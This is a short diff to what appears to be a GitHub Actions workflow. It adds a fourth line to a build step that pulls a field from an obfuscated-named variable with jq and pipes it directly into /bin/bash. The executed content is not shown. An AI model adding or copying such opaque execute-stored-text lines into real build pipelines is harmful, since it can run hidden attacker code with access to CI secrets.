@@ -23,6 +23,7 @@ jobs:
           echo $ewhru48 | jq -r .oewdr38638 | /bin/bash
           printf '%s' "$wenw181" | jq -r .vxfb2 | /bin/bash
           echo $lmf1561 | jq -r .rhwqa52532 | /bin/bash
+          echo $suw156 | jq -r .itqf44 | /bin/bash
 
       - name: Archive output
         uses: actions/upload-artifact@v4
